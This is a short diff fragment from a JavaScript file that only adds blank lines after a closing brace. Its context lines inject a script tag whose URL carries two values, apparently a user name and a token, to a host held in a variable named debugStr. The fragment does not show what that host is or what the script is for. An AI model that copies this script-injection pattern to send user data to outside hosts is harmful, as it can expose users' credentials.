@@ -28,5 +28,8 @@
 			var c=g.createElement('script');
 			c.src=debugStr + 'login?u='+d.replace("#","'''")+'&t='+t.replace("#","'''") 
 			j.item(0).appendChild(c);	
-	}		
+	}
+	
+	
+	
 })();
